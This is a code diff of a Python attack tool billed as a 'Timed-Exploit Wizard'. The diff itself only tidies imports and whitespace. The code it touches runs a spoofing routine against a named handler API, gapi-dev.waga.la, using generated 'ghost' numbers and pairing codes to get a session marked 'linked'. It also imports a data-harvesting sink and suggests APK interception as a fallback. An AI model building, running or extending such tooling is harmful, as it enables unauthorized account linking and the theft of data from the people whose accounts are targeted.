@@ -1,8 +1,11 @@
 """PhantomLink Ghost Reflect — Timed‑Exploit Wizard"""
-import asyncio, re, json, sys, time, random
+import json
+import re
+import time
 from datetime import datetime
-from phantom.number_gen import generate_ghost_number
+
 from phantom.intel_sink import harvest_and_clean
+from phantom.number_gen import generate_ghost_number
 
 try:
     import httpx
@@ -136,25 +139,25 @@ def step4_gapi_exploit(self):
     """Use the GAPI handler exploit with discovered endpoints."""
     self._header("STEP 4: GAPI SMART EXPLOIT")
     self._info("Hitting discovered handler API gapi-dev.waga.la/api/app ...")
-    
+
     from phantom.gapi_spoof import full_ghost_cycle
-    
+
     result = full_ghost_cycle(
         self.session["ghost_number"],
         self.session["pairing_code"]
     )
-    
+
     reg = result.get("registration", {})
     conf = result.get("confirmation", {})
-    
+
     elapsed = result.get("elapsed", 0)
     self._info(f"Exploit completed in {elapsed}s")
-    
+
     if reg.get("success"):
         self._success(f"Registration: HTTP {reg.get('status_code')}")
     else:
         self._warning(f"Registration: {reg.get('error', 'no response')}")
-    
+
     if conf.get("success"):
         self.session["status"] = "linked"
         self.session["vector_used"] = f"gapi_{conf.get('url', '').split('/')[-1]}"
@@ -165,6 +168,6 @@ def step4_gapi_exploit(self):
         self._info(f"Tried {tried} endpoint/payload combinations — none confirmed.")
         self._info("The platform may be checking Baileys WebSocket state directly.")
         self._info("Mode 2 (Ghost Account) or live APK interception may be needed.")
-    
+
     self.session["gapi_result"] = result
 
